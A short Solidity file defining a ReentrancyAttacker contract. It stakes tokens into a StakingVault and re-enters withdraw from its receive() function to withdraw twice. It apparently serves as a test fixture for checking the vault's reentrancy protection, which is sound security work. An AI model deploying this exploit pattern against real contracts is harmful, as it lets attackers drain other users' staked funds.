// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "./StakingVault.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract ReentrancyAttacker {
    StakingVault public vault;
    IERC20 public stakingToken;
    bool public isAttacking;
    uint256 public attackAmount;

    constructor(address payable _vault, address _stakingToken) {
        vault = StakingVault(_vault);
        stakingToken = IERC20(_stakingToken);
    }

    function attack(uint256 amount) external {
        attackAmount = amount;
        
        // Approve and stake
        stakingToken.approve(address(vault), amount);
        vault.stake(amount);

        isAttacking = true;
        
        // Call withdraw to trigger receive() reentrancy
        vault.withdraw(amount);
    }

    receive() external payable {
        if (isAttacking) {
            isAttacking = false;
            vault.withdraw(attackAmount);
        }
    }
}
